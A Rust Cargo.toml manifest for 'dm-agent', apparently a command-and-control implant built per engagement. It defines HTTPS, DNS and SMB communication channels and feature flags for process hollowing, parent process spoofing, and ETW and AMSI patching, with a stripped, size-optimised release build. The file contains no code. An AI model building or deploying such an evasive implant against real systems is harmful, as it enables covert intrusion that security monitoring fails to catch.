[package]
name    = "dm-agent"
version = "0.1.0"
edition = "2021"

# Build-time configuration injected by the build service
# These are set via environment variables when building a specific payload.
# Default values here are for local development only.

[features]
default  = ["channel-https"]
channel-https = []
channel-dns   = []
channel-smb   = []

# Evasion features — enabled by the build service per engagement
process-hollow = []
parent-spoof   = []
etw-patch      = []
amsi-patch     = []

[dependencies]
# Crypto
aes-gcm    = { version = "0.10", default-features = false, features = ["aes", "alloc"] }
p256       = { version = "0.13", default-features = false, features = ["ecdh"] }
rand       = { version = "0.8", default-features = false, features = ["getrandom"] }
sha2       = { version = "0.10", default-features = false }
hkdf       = { version = "0.12", default-features = false }
zeroize    = { version = "1.7", features = ["zeroize_derive"] }

# HTTP (for the HTTPS channel)
ureq    = { version = "2.9", default-features = false, features = ["tls", "json"] }
rustls  = { version = "0.23", default-features = false, features = ["ring", "tls12", "std"] }

# Serialization
serde      = { version = "1", features = ["derive"] }
serde_json = { version = "1" }

# Utilities
base64     = { version = "0.22" }
uuid       = { version = "1.8", features = ["v4"] }

[target.'cfg(unix)'.dependencies]
libc = { version = "0.2", default-features = false }

[target.'cfg(windows)'.dependencies]
# Windows API bindings — raw, no CRT dependency
windows-sys = { version = "0.52", features = [
    "Win32_Foundation",
    "Win32_System_Threading",
    "Win32_System_Memory",
    "Win32_Security",
    "Win32_System_LibraryLoader",
    "Win32_System_Diagnostics_Debug",
    "Win32_System_Diagnostics_ToolHelp",
    "Win32_System_SystemInformation",
    "Win32_Networking_WinSock",
] }

[profile.release]
opt-level     = "z"    # optimize for size
lto           = true
codegen-units = 1
strip         = true   # strip debug symbols
panic         = "abort" # no unwinding runtime overhead

[build-dependencies]
# Build script reads env vars injected by the build service
